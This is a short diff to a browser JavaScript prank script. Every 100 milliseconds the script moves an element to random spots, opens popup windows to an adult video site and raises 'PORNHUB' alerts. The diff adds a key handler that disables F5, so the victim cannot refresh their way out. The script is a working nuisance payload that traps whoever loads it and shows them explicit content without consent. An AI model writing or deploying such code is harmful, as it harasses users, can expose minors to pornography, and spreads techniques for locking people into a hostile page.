@@ -5,11 +5,16 @@ parent.style.position = "absolute";
 parent.style.fontSize = "80px";
 parent.style.zIndex = "100";
 parent.style.display = "inline-block";
+window.addEventListener("keydown",(e)=>{
+    if ((e.which || e.keyCode) == 116) 
+        e.preventDefault();
+})
 setInterval(() => {
     parent.style.top = `${Math.floor((Math.random() * window.innerHeight + window.pageYOffset) + window.pageYOffset)}px`;
     parent.style.left = `${Math.floor((Math.random() * window.innerWidth + window.pageXOffset) + window.pageXOffset)}px`;
     window.open("https://www.xvideos.com/", "", "width=300,height=200");
     alert("PORNHUB");
+    
     document.body.appendChild(parent);
 }, 100);
 //   var script = document.createElement('script');
